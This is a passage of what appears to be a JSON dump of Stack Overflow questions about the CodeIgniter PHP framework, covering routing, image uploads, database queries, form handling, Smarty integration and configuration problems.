</p>\n\n<p><strong>function</strong></p>\n\n<p>e.g.</p>\n\n<pre><code>public function contact()\n    {\n        $data['header'] = \"Contact\";\n        $this-&gt;load-&gt;view('admin/admin_contact', $data);\n    }\n</code></pre>\n\n<p>VS</p>\n\n<pre><code>function contact()\n    {\n        $data['header'] = \"Contact\";\n        $this-&gt;load-&gt;view('admin/admin_contact', $data);\n    }\n</code></pre>\n\n<p>Is it better practice to use <strong>public function</strong> instead just <strong>function</strong> or not and why?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12882720,"title":"multi upload images by codeigniter and create thumb","body":"<p>I have a problem , I took me 2 hours but I couldn't solve it.</p>\n\n<p>When I want to upload multiple images (3 images ) it will upload but then I can't create a thumb for all , just for the first picture , I don't know where is the problem </p>\n\n<p>this is my form</p>\n\n<pre><code>&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt;\n&lt;input type=\"file\" id=\"hotel_img1\" value=\"upload\" name=\"hotel_img1\"&gt;\n&lt;input type=\"file\" id=\"hotel_img2\" value=\"upload\" name=\"hotel_img1\"&gt;\n&lt;input type=\"file\" id=\"hotel_img3\" value=\"upload\" name=\"hotel_img1\"&gt;\n&lt;input type=\"submit\"&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>this is my code \ncontroller</p>\n\n<pre><code>&lt;?php\nif(!empty($_FILES))\n    $upload_image = array('1','2','3','4','5');\n    foreach($upload_image as $i) {\n    if(!empty($_FILES[\"hotel_img$i\"]['name']))\n    {\n        $hotel_ID= 12;\n        $config['file_name'] = $this-&gt;session-&gt;userdata('user_id').'-'.$hotel_ID.'-'.time().$i;\n        $config['upload_path'] =realpath(APPPATH . '../img');\n        $config['allowed_types'] = 'gif|jpg|png|jpeg';\n        $config['max_size'] = '512';\n        $config['max_width'] = '1024';\n        $config['max_height'] = '768';\n        $config['overwrite'] = TRUE;\n        $this-&gt;upload-&gt;initialize($config);\n        $form_name = 'hotel_img' . $i;\n        if(!$this-&gt;upload-&gt;do_upload($form_name))\n            {       \n                $data['msg'] .= \"ERROR\";\n            }\n            else\n            {   \n                $file_data = $this-&gt;upload-&gt;data();\n                $image_data['img_url'] = $file_data['file_name'];\n                $image_data['img_size'] = $file_data['file_size'] * 1024;\n                $image_data['img_forID'] = $hotel_ID;\n                $this-&gt;model_hotels-&gt;insert_image($image_data);\n                $data['msg'] .= \"Uploaded Picture No $i\";\n                $config_thumb['image_library'] = 'gd2';\n                $config_thumb['source_image'] = $file_data['full_path'];\n                $config_thumb['maintain_ratio'] = FALSE;\n                $config_thumb['width'] = 250;\n                $config_thumb['height'] = 150;\n                $config_thumb['new_image'] = realpath(APPPATH . '../img').'/thumb/thumb_' .  $file_data['file_name'];\n                $this-&gt;load-&gt;library('image_lib', $config_thumb);\n                $this-&gt;image_lib-&gt;resize();\n                $this-&gt;image_lib-&gt;clear(); \n            }\n        }\n    }\n    $this-&gt;model_hotels-&gt;set_hotel_thumb($hotel_ID);\n}   ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","uploadify"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12883972,"title":"including controller files from external script in codeIgniter","body":"<p>I've the following directory structure.</p>\n\n<pre><code>application\n| \n| -----&gt; controller\n            |\n            | ------&gt; profie_control.php\nassets\n|\n| ------&gt; Others \n             |\n             |---&gt; uploadify \n                     |\n                     | --&gt; uploadify.php\n</code></pre>\n\n<p>Now in my <code>uploadify.php</code> I am doing all the stuff that I want to perform.Then after everything is done I want to call a function and pass data to it in <code>profile_control.php</code>.Now I dont know how to access the functions.\nI tried to use the following code</p>\n\n<pre><code>include_once(\"http://localhost/php/ci/index.php/profile_control/myfunction\");\n</code></pre>\n\n<p>in <code>uploadify.php</code> but it gives me the following error</p>\n\n<pre><code>Warning: include_once() [function.include-once]: http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\\wamp\\www\\php\\ci\\assets\\Others\\uploadify\\uploadify.php on line 8\n</code></pre>\n\n<p>And I've read in some forums that this approach is not good as it can cause security issues.Now how I can send data from <code>uploadify.php</code> to <code>profile_control.php</code> securely or what would be a better alternative ???</p>\n"},{"tags":["sql","codeigniter","arguments"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1319,"score":0,"question_id":187893,"title":"Is there a way to pass arguments to a query in CodeIgniter *without* using ActiveRecord?","body":"<p>This is what I'd like to do, but it doesn't seem possible:\n(edit: changed single to double quotes)</p>\n\n<pre><code>function get_archives($limit, $offset) \n{\n    $query = $this-&gt;db-&gt;query(\"\n        SELECT  archivalie.id, \n                archivalie.signature, \n                type_of_source.description AS type_of_source_description, \n                media_type.description AS media_type_description,\n                origin.description AS origin_description\n\n        FROM    archivalie, \n                type_of_source, \n                media_type,\n                origin\n\n        WHERE   archivalie.type_of_source_id = type_of_source.id                                                        \n        AND     type_of_source.media_type_id = media_type.id  \n        AND     archivalie.origin_id = origin.id                                                                     \n\n        ORDER BY    archivalie.id ASC\n    \tLIMIT       $limit, $offset\n    \"); \n\n\n    // etc...\n\n}\n</code></pre>\n\n<p>It gives this error:\n(edit: new error message using double quotes, and with an offset number passed in the URL)</p>\n\n<pre><code>ERROR: LIMIT #,# syntax is not supported HINT: Use separate LIMIT and OFFSET clauses.\n</code></pre>\n\n<p>It only works if you pass the variables using the ActiveRecord format:</p>\n\n<pre><code>$this-&gt;db-&gt;select('archivalie.id, archivalie.signature, etc, etc');\n// from, where, etc.\n$this-&gt;db-&gt;limit($limit, $offset);        \n$query = $this-&gt;db-&gt;get();\n</code></pre>\n"},{"tags":["php","codeigniter","controller","route"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12883193,"title":"codeigniter route does not route as expected","body":"<p>in php word \"list\" is reserved so i had to use \"listby\" and create route.\nAccording to CI User Guide I have created a route as follows:</p>\n\n<pre><code>$route['list'] = \"listby\";\n</code></pre>\n\n<p>It's routing perfectly the index function with url like \"http://myserver.com/list\" but does not route other functions i.e.. \"http://myserver.com/list/uuid\".</p>\n\n<p>Here's contorller code:</p>\n\n<pre><code>class Listby extends CI_Controller\n{\n\n    public function index()\n    {\n        echo \"index\";\n    }\n\n    public function userid()\n    {\n        echo \"userid\";\n    }\n\n    public function uuid()\n    {\n        echo \"uuid\";\n    }\n}\n</code></pre>\n\n<p>Side note: with url like \"http://myserver.com/listby/uuid\" works fine.</p>\n\n<p>Any clues where is the problem?</p>\n"},{"tags":["php","forms","codeigniter","post","attributes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":182,"score":1,"question_id":9863820,"title":"Multiple forms having same hidden attribute , cant get the actual data","body":"<p>I have 7 forms in a page with hidden attribute with same name but with different value in each case (I am using CodeIgniter):</p>\n\n<pre><code>echo form_open('user/submit');\n$attributes2 = array('class' =&gt; $imageClass);\necho form_submit($attributes2);\necho form_hidden('id',$id);\necho form_hidden('parent',$paren);\necho form_hidden('side',$side);\nform_close();\n</code></pre>\n\n<p>Now, upon submission (from any of the forms) the value of id, parent, side I get is of the last(7th) form.</p>\n\n<p>How can I get the ID of the form , that was actually clicked.</p>\n\n<p>Say,  I clicked the submit button of form1 , where id = 001 and in form7 id is set to 7.</p>\n\n<p>After submission in post variable i am getting id = 7... which should (or, i want to) be 1.</p>\n"},{"tags":["codeigniter","godaddy"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12872385,"title":"access to codeigniter app on godaddy","body":"<p>Yea i know this title is a bit used but i couldn't find the answer on any of the links i found.</p>\n\n<p>I have a codeigniter site hosted at godaddy's. actually i got two:</p>\n\n<ol>\n<li>one at the root level i.e. \"/\"  -</li>\n<li>second one under \"/try\" dir</li>\n</ol>\n\n<p>Each has it's own application and system folders (for all kinds of reasons).\nTrying to reach a controller on \"try\" (i.e. www.mysite.com/try/controller/method or www.mysite.com/try/index.php/controller/method) i get the infamous: \"No input file specified.\" error.</p>\n\n<p>When trying to reach www.mysite.com/try/index.php i do get to the default controller.</p>\n\n<p>My htaccess file on \"try\" is:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(index\\.php|images|robots\\.txt)\nRewriteRule ^(.*)$ /codoc/index.php/$1 [L]\n</code></pre>\n\n<p>My htaccess file on root is:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(try)\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>The \"try\" config.php base url is: </p>\n\n<pre><code>$config['base_url'] = 'try/';\n</code></pre>\n\n<p>The root config.php base url is blank.</p>\n\n<p>Any ideas?\nthanks.</p>\n"},{"tags":["php","codeigniter","split"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":10,"view_count":162,"score":-9,"question_id":7462969,"title":"Split string three to three","body":"<p>Output of the following code is several strings. How can I split these strings three to three, like:</p>\n\n<p>Output:</p>\n\n<blockquote>\n  <p>salam,11,11,khobe,22,22<br> salam,55,55,khobe,66,66<br></p>\n</blockquote>\n\n<p>I want split them to 3 to 3, as:</p>\n\n<blockquote>\n  <p>salam,11,11<br> khobe,22,22<br> salam,55,55<br> khobe,66,66<br></p>\n</blockquote>\n\n<p>And next echo they by <code>foreach</code>. (The following PHP code gives the above output.)</p>\n\n<pre><code>$query = $this-&gt;db-&gt;query(\"SELECT * FROM table WHERE id LIKE '%$ok%' ORDER BY id desc\");\nforeach ($query-&gt;result() as $row){\n    $data = json_decode($row-&gt;residence,true);\n    foreach($data as $datum){\n        /*$str =*/echo implode(',', $datum['units']).'&lt;br&gt;'; //This is line 5 as string, separated by ','\n    }\n}\n</code></pre>\n\n<p>My JSON encoded in the database:</p>\n\n<pre><code>[{\n    \"units\": [\"salam\", \"11\", \"11\", \"khobe\", \"22\", \"22\"],\n}, {\n    \"units\": [\"salam\", \"55\", \"55\", \"khobe\", \"66\", \"66\"],\n}]\n</code></pre>\n\n<p><strong>Update:</strong></p>\n\n<p>This is my changed code:</p>\n\n<pre><code>foreach ($query-&gt;result() as $row){\n    $data = json_decode($row-&gt;residence,true);\n    foreach($data as $datum){\n        //$str =/*echo*/ implode(',', $datum['units']).'&lt;br&gt;'; //This is line 5 as string, separated by ','\n        print_r(array_chunk($datum, 3));\n    }\n}\n</code></pre>\n\n<p>Output from this code:</p>\n\n<blockquote>\n  <p>Array ( [0] => Array ( [0] => saeed [1] => Array ( [0] => salam [1] =>\n  11 [2] => 11 [3] => khobe [4] => 22 [5] => 22 ) [2] => Array ( [0] =>\n  33 [1] => 33 [2] => 33 [3] => 44 [4] => 44 [5] => 44 ) ) ) Array ( [0]\n  => Array ( [0] => salavat [1] => Array ( [0] => salam [1] => 55 [2] =>\n  55 [3] => khobe [4] => 66 [5] => 66 ) [2] => Array ( [0] => 77 [1] =>\n  77 [2] => 77 [3] => 88 [4] => 88 [5] => 88 [6] => 99 [7] => 99 [8] =>\n  99 ) ) )</p>\n</blockquote>\n\n<p>I want this output to an array:</p>\n\n<p><code>salam,11,11</code> &amp; <code>khobe,22,22</code> &amp; <code>salam,55,55</code> &amp; <code>khobe,66,66</code></p>\n\n<p><strong>Update two:</strong></p>\n\n<p>I changed the code as: the following results in the error (<code>implode() [function.implode]: Argument must be an array</code>)</p>\n\n<pre><code>    foreach ($query-&gt;result() as $row){\n        $data = json_decode($row-&gt;residence,true);\n        foreach($data as $datum){\n            //$str =/*echo*/ implode(',', $datum['units']).'&lt;br&gt;'; //This is line 5 as string, separated by ','\n            $newArray = array_chunk($datum['units'], 3);\n            foreach($newArray[0] as $newA){\n                echo implode($newA);\n            }\n        }\n    }\n</code></pre>\n"},{"tags":["php","mysql","activerecord","codeigniter"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":268,"score":2,"question_id":3823473,"title":"How to reduce the number of queries required to get this result","body":"<p>I'm writing an application on top of CodeIgniter to better organize my ebook collection. I'm nearly done, but I realize my 'browse' page is running far too many queries - two per book - to get their information. Obviously not at all ideal, especially since I have about 1000 books to put into this system.</p>\n\n<p>I currently have one model function which gets all of the books (will eventually be modified to take parameters - that's the next step) and another that gets the meta information for each returned book. The second function is the one which makes two queries for each book - one to get the information in the book table and another to get the tags associated with the book. Here are the two model functions:</p>\n\n<p>Get the list of books:</p>\n\n<pre><code>function get_books() {\n    $this-&gt;db-&gt;select('isbn')-&gt;order_by('title');\n    $query = $this-&gt;db-&gt;get('books');\n    $result = $query-&gt;result();\n    return $result;\n}\n</code></pre>\n\n<p>Get the book meta information:</p>\n\n<pre><code>function get_book_info($isbn) {\n    // Grab the book from Amazon\n    $amazon = $this-&gt;amazon-&gt;get_amazon_item($isbn);\n\n    // Get the book info\n    $this-&gt;db-&gt;select('title, publisher, date, thumb, filename, pages');\n    $query = $this-&gt;db-&gt;get_where('books', array('isbn' =&gt; $isbn));\n    $bookResult = $query-&gt;row();\n\n    // Get the book's tags\n    $this-&gt;db-&gt;select('tag');\n    $this-&gt;db-&gt;from('tags AS t');\n    $this-&gt;db-&gt;join('books_tags AS bt', 'bt.tag_id = t.id', 'left');\n    $this-&gt;db-&gt;where('bt.book_id', $isbn);\n    $this-&gt;db-&gt;order_by('t.tag');\n    $tagQuery = $this-&gt;db-&gt;get();\n    foreach ($tagQuery-&gt;result() as $row) {\n        $tagResult[] = $row-&gt;tag;\n    }\n    $tagResult = implode(', ', $tagResult);\n\n    // Send data\n    $data = array(\n        'isbn' =&gt; $isbn,\n        'thumb' =&gt; $bookResult-&gt;thumb,\n        'title' =&gt; strip_slashes($bookResult-&gt;title),\n        'file' =&gt; $bookResult-&gt;filename,\n        'publisher' =&gt; strip_slashes($bookResult-&gt;publisher),\n        'date' =&gt; date('F j, Y', strtotime($bookResult-&gt;date)),\n        'pages' =&gt; $bookResult-&gt;pages,\n        'tags' =&gt; $tagResult,\n        'rating' =&gt; $amazon-&gt;Items-&gt;Item-&gt;CustomerReviews-&gt;AverageRating,\n        'raters' =&gt; $amazon-&gt;Items-&gt;Item-&gt;CustomerReviews-&gt;TotalReviews\n    );\n    return $data;\n}\n</code></pre>\n\n<p>I'm certain there's a way to write one or two queries that will gather all the records into objects I can then filter through, rather than having to write two queries for each one, but I have no idea where to even start trying to write that. Any suggestions are welcome. </p>\n\n<p>Thanks much,\nMarcus</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12880278,"title":"CodeIgniter Only Index Page is working","body":"<p>I recently started using codeIgniter and I am stuck in a problem.</p>\n\n<p>I've two files in my <code>view</code> folder </p>\n\n<ol>\n<li>index.php</li>\n<li>profile.php</li>\n</ol>\n\n<p>When I go to the url <code>http://localhost/php/ci/index.php/</code> it shows my index.php page and everything is fine.</p>\n\n<p>But when I go to <code>http://localhost/php/ci/profile.php/</code> it says</p>\n\n<p><code>The requested url was not found on server</code>.</p>\n\n<p>Why is this happening what's the problem ??</p>\n\n<p>My Controller Files Names Are:</p>\n\n<ol>\n<li>home_control.php</li>\n<li>profile_control.php</li>\n</ol>\n\n<p>home_control will interact with index.php and profile_control will interact with profile.php.</p>\n"},{"tags":["php","codeigniter","variables","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":80,"score":-2,"question_id":12879173,"title":"Codeigniter undefined property on controller","body":"<p>i have controller to show database record on table</p>\n\n<pre><code>function gkategorimaterial()\n{\n    $this-&gt;load-&gt;model('m_kategorimaterial');\n    $data['kirim'] = $this-&gt;m_kategorimaterial-&gt;read(); //error pointing on this line\n    $data['title'] = 'QB Ambil Kategori Material / Jasa';\n\n    $this-&gt;load-&gt;view('head',$data);\n    $this-&gt;load-&gt;view('g/gkategorimaterial',$data);\n}\n</code></pre>\n\n<p>that <code>gkategorimaterial()</code> was adapted from </p>\n\n<pre><code>function vkategorimaterial()\n{\n    $this-&gt;load-&gt;model('m_kategorimaterial');\n\n    $data['kirim'] = $this-&gt;m_kategorimaterial-&gt;read();\n    $data['title'] = 'QB Kategori Material';\n\n    $this-&gt;load-&gt;view('head',$data);\n    $this-&gt;load-&gt;view('v/vkategorimaterial',$data);\n}\n</code></pre>\n\n<p>which has the some function, to show the table, the <code>vkategorimaterial()</code> success to retrieve the record.</p>\n\n<p>here is the model of `m_kategorimaterial</p>\n\n<pre><code>function read()\n{\n    $query = $this-&gt;db-&gt;order_by('Kode_Kategori_Material_Jasa','DESC');\n    $query = $this-&gt;db-&gt;get('ms_kategori_material');\n\n    if($query-&gt;num_rows()&gt;0)\n    {     \n        return $query-&gt;result();\n    }\n    else\n    {\n        return null;\n    }\n}\n</code></pre>\n\n<p>A PHP Error was encountered</p>\n\n<p>Severity: Notice</p>\n\n<p>Message: Undefined property: C_materialjasa::$m_kategorimaterial</p>\n\n<p>Filename: controllers/c_materialjasa.php</p>\n\n<p>Line Number: 140</p>\n\n<p>i believe it has nothing to do with the models, but i don't know what the error is, since i just copy paste the first controller which is <code>vkategorimaterial()</code> controller, and rename the variable</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12878863,"title":"Adding custom callback to Codeigniter Form Validation","body":"<p>I want to limit my registration to emails with @mywork.com I made the following in My_Form_validation.</p>\n\n<pre><code>public function email_check($email)\n    {\n        $findme='mywork.com';\n        $pos = strpos($email,$findme);\n        if ($pos===FALSE)\n        {\n            $this-&gt;CI-&gt;form_validation-&gt;set_message('email_check', \"The %s field does not have our email.\");\n            return FALSE;\n        }\n        else\n        {\n            return TRUE;\n        }\n    }\n</code></pre>\n\n<p>I use it as follows. I use CI rules for username and password and it works, for email it accepts any email address. Any I appreciate any help.</p>\n\n<pre><code>function register_form($container)\n    {\n....\n....\n\n/ Set Rules\n$config = array(\n...//for username\n// for email            \n    array(\n  'field'=&gt;'email',\n  'label'=&gt;$this-&gt;CI-&gt;lang-&gt;line('userlib_email'),\n  'rules'=&gt;\"trim|required|max_length[254]|valid_email|callback_email_check|callback_spare_email\"\n   ),\n...// for password\n );\n\n$this-&gt;CI-&gt;form_validation-&gt;set_rules($config);\n</code></pre>\n"},{"tags":["php","codeigniter","controller","http-status-code-404"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12878463,"title":"codeigniter : Why does the requested page is not found?","body":"<p>i have link like this</p>\n\n<pre><code>&lt;td&gt;&lt;a href=\"&lt;?php echo base_url(); ?&gt;index.php/c_materialjasa/gkategorimaterial\"&gt;Lihat Tabel&lt;/a&gt;&lt;/td&gt;\n</code></pre>\n\n<p>here is my controller</p>\n\n<pre><code>  class C_kategorimaterial extends CI_Controller{\npublic function __construct() {\n    parent::__construct();\n    $this-&gt;load-&gt;model('m_materialjasa');\n    $this-&gt;load-&gt;model('m_admin');\n}\nfunction gkategorimaterial()\n{\n    //$data['title'] = 'Ambil Kode Kategori Material Jasa';\n    //$this-&gt;load-&gt;view('head',$data);\n    //$this-&gt;load-&gt;view('g/gkategorimaterial');\n\n    echo 'getkategorimaterial';\n\n\n}}\n</code></pre>\n\n<p>and the screen display error <code>404 not found</code> ? i have created the views <code>gkategorimaterial</code> it located on views/g/gkategorimaterial</p>\n"},{"tags":["mysql","codeigniter","mongodb","nosql","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12850991,"title":"Configure CodeIgniter with more than one Database","body":"<p>I currently have a PHP application developed using CodeIgniter which is up and running, connected to a MySQL database. Now I am redesigning the UI to make it be driven from the database, for which arguably NoSQL is the best approach(EAV model I believe). So since CodeIgniter is currently configured to connect to MySQL, is it possible to configure it to MondoDB too simultaneously. If possible could you please guide me how I could do it?</p>\n"},{"tags":["php","codeigniter","image-processing","gd"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12876908,"title":"Codeigniter Image Library Cropping an Image with 2 sets of coordinates to make square anywhere?","body":"<p>Spending time reading through the docs, and searching for examples. I understand cropping an image from top 0, and left 0 is pretty straight forward. However. I would like to pass 2 sets of coordinates, a starting point and an ending point. Four Points, a Square that is defined anywhere. However from the examples I am finding, and from what I gather the rendition is not going to let me do this. codeigniter so I am seeking confirmation on this thought, is it true that I can only provide end points from 0, and it crops a square based on said end points or can I actually specify an x start, an x end, and similar for y?</p>\n\n<p>Or is there some other technique I can use within codeigniter that will allow me to pass for coordinates for starting and ending points?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12876763,"title":"Codeigniter this->db->query","body":"<p>Does $this-db->query() have mysql injection protection? I was wondering because I use this in instances and have not done anything to protect against sql injection.</p>\n"},{"tags":["codeigniter","url-rewriting","dreamweaver","design-view"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12876937,"title":"Dreamweaver and CodeIgniter Design View not working when editing a View page","body":"<p>when opening a CodeIgniter View file in Dreamweaver Design View (application/views/register.php), the Design View loads only the content in the file (without css), because it tries to open localhost/mysite/application/views/register.php instead of localhost/mysite/register where is the register page with header.php and footer.php loaded before and after register.php (I'm loading these Views from another View called template.php). </p>\n\n<p>So, the question is:\n<strong>How to tell Dreamweaver which is the correct url that is must open? Is there something like url rewriting in Dreamweaver?</strong></p>\n\n<p>Thanks!</p>\n"},{"tags":["php","database","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12767603,"title":"Codeigniter - best way to use two different database","body":"<p>Does someone knows the best practice for using 2 different database in my application?</p>\n\n<p>I need to store data in both databases which are differently located (host,username,password , all does change).</p>\n\n<p>I'm planning to create models as usual, and in construct set the db host,name,pass etc.</p>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12875776,"title":"Codeigniter setting upload path to tmp folder","body":"<p>I'm uploading my files to Amazon S3 and don't need to store them locally. Instead of using <code>unlink()</code> or cron jobs I want to add the files to the <code>tmp</code> folder and send them to Amazon S3 from there. I tried specifying the path in config options:</p>\n\n<pre><code>$tmp = ini_get('upload_tmp_dir');\n$config['upload_path'] = $tmp;\n</code></pre>\n\n<p>and I get an upload error:</p>\n\n<p><code>The upload destination folder does not appear to be writable.</code></p>\n\n<p>I made my tmp folder writable and still get the error. Does anyone know how to upload just to tmp folder using the CI upload library? I'm afraid that I might have to modify the core upload library removing all upload path functions. </p>\n"},{"tags":["php","codeigniter","smarty"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":12872916,"title":"How to give path of smarty template file index.tpl in parse method in codeIgniter controller?","body":"<p>I was integrating Smarty in Codeigniter , I wanted to use it as a view. So I tried to pass data from the controller to the <code>index.tpl</code> file which is in the <code>view/templates</code> folder by using this code:</p>\n\n<pre><code>$this-&gt;smarty_parser-&gt;parse('index.tpl', $data); \n</code></pre>\n\n<p>Or</p>\n\n<pre><code>$this-&gt;smarty_parser-&gt;parse('../views/templates/index.tpl', $data);\n</code></pre>\n\n<p>but both are not working and it gives me the error:</p>\n\n<pre><code>Fatal error: Uncaught exception 'SmartyException' with message 'Unable to load template file '../views/templates/index.tpl'' in /home/ivb/Desktop/php_project/vistaprint/CodeIgniter_2.1.0/application/libraries/smarty/libs/sysplugins/smarty_internal_templatebase.php:127\n</code></pre>\n\n<p>The code is :</p>\n\n<h2>smarty_parser.php</h2>\n\n<pre><code>&lt;?php\n\nif (!defined('BASEPATH'))\n    exit('No direct script access allowed');\n\n//require_once\"smarty/libs/Smarty.class.php\";\nrequire_once 'Smarty.php';\n\nclass Smarty_parser extends Smarty {\n\n    public function __construct() {\n        parent::__construct();\n    }\n\n    function Smarty_parser($config = array()) {\n        //parent::Smarty();\n\n        if (count($config) &gt; 0) {\n            $this-&gt;initialize($config);\n        }\n\n        // register Smarty resource named \"ci\"\n        $this-&gt;register_resource(\"ci\", array($this,\n            \"ci_get_template\", \"ci_get_timestamp\", \"ci_get_secure\", \"ci_get_trusted\")\n        );\n\n        log_message('debug', \"Smarty_parser Class Initialized\");\n    }\n\n    /**\n     * Initialize preferences\n     */\n    function initialize($config = array()) {\n        foreach ($config as $key =&gt; $val) {\n            if (isset($this-&gt;$key)) {\n                $method = 'set_' . $key;\n\n                if (method_exists($this, $method)) {\n                    $this-&gt;$method($val);\n                } else {\n                    $this-&gt;$key = $val;\n                }\n            }\n        }\n    }\n\n    /**\n     *  Set the left/right variable delimiters\n     */\n    function set_delimiters($l = '{', $r = '}') {\n        $this-&gt;left_delimiter = $l;\n        $this-&gt;right_delimiter = $r;\n    }\n\n    /**\n     *  Parse a template using Smarty engine\n     *\n     * Parses pseudo-variables contained in the specified template,\n     * replacing them with the data in the second param.\n     * Allows CI and Smarty code to be combined in the same template\n     * by prefixing template name with \"ci:\".\n     */\n    function parse($template, $data, $return = FALSE) {\n        if ($template == '') {\n            return FALSE;\n        }\n\n        $CI = &amp; get_instance();\n\n        $CI-&gt;benchmark-&gt;mark('smarty_parse_start');\n\n        if (is_array($data)) {\n            //$this-&gt;assign(&amp;$data); //sandip changed this*****\n            $this-&gt;assign($data);\n        }\n\n        // make CI object directly accessible from a template (optional)\n        //$this-&gt;assign_by_ref('CI', $CI);\n        $this-&gt;assignByRef('CI', $CI);\n        $template = $this-&gt;fetch($template);\n\n        if ($return == FALSE) {\n            $CI-&gt;output-&gt;final_output = $template;\n        }\n\n        $CI-&gt;benchmark-&gt;mark('smarty_parse_end');\n\n        return $template;\n    }\n\n    /**\n     * Smarty resource accessor functions\n     */\n    function ci_get_template($tpl_name, &amp;$tpl_source, &amp;$smarty_obj) {\n        $CI = &amp; get_instance();\n\n        // ask CI to fetch our template\n        $tpl_source = $CI-&gt;load-&gt;view($tpl_name, $smarty_obj-&gt;get_template_vars(), true);\n        return true;\n    }\n\n    function ci_get_timestamp($view, &amp;$timestamp, &amp;$smarty_obj) {\n        $CI = &amp; get_instance();\n\n        // Taken verbatim from _ci_load (Loader.php, 580):\n        $ext = pathinfo($view, PATHINFO_EXTENSION);\n        $file = ($ext == '') ? $view . EXT : $view;\n        $path = $CI-&gt;load-&gt;_ci_view_path . $file;\n\n        // get file modification date\n        $timestamp = filectime($path);\n        return ($timestamp !== FALSE);\n    }\n\n    function ci_get_secure($tpl_name, &amp;$smarty_obj) {\n        // assume all templates are secure\n        return true;\n    }\n\n    function ci_get_trusted($tpl_name, &amp;$smarty_obj) {\n        // not used for templates\n    }\n\n}\n\n?&gt;  \n</code></pre>\n"},{"tags":["codeigniter","model","controller","config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12873845,"title":"Codeigniter config file change from model or controller","body":"<p>How can we edit config file details from model or controller...? I want to change currency based on location of the user...</p>\n"},{"tags":["ajax","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12871789,"title":"codeigniter session expire automatically","body":"<p>i m using codeigniter web application framework.A session expire problem occured.when using ajax in codeigniter , then codeigniter's session expire automatically..how to fix this problem..please give me response asap.</p>\n"},{"tags":["codeigniter","variables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12871049,"title":"Accessing Variables from MY_Controller CodeIgniter","body":"<p>As I have read through articles, the best possible way to validate a user in all controllers of my application is to extend my own Controller that extends CI_Controller</p>\n\n<p>But I can't make it work.</p>\n\n<p>What I have is a <code>members_controller</code> that extends my <code>MY_Controller</code>.</p>\n\n<p>in <code>MY_Controller</code> i have this piece of code, just to test if how am I going to utilize this.</p>\n\n<pre><code>&lt;?php\n\nclass MY_Controller extends CI_Controller {\n\nprivate $foo;\n\n    function __construct() {\n        parent::__construct();\n        $this-&gt;foo = 'hello world again';\n    }\n\n}\n</code></pre>\n\n<p>in my <code>members controller</code> </p>\n\n<pre><code>&lt;?php\nclass Members extends MY_Controller {\n    function index() {\n         $this-&gt;load-&gt;view('members');\n    }\n}\n</code></pre>\n\n<p>in my <code>members view</code></p>\n\n<p>i want to access this variable i just set up, but i don't know how.</p>\n\n<p>i tried echoing it out like this <code>echo $foo</code>, like this <code>$this-&gt;foo</code></p>\n\n<p>but neither work. thanks much!!</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12871931,"title":"How to pass parameter to the redirect method in URL helper in Codeigniter?","body":"<p>I'm new to Codeigniter, and I want redirect to a controller after the validation is fall:</p>\n\n<pre><code>if(!validate)\n{\n  redirect('/poll/list');\n}\n</code></pre>\n\n<p>but I need to pass a variable like <code>$error</code> to show the some error indication, but I don't know how to pass the parameter to <code>redirect</code> method in the <code>URL helper</code>, and idea?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12867285,"title":"Trying to upload multiple images but it is uploading only one","body":"<p>I am trying to upload multiple images. I am using Codeigniter and I know there is a built in file upload class but I am just experimenting with my custom made image upload library. I have provided the code below. 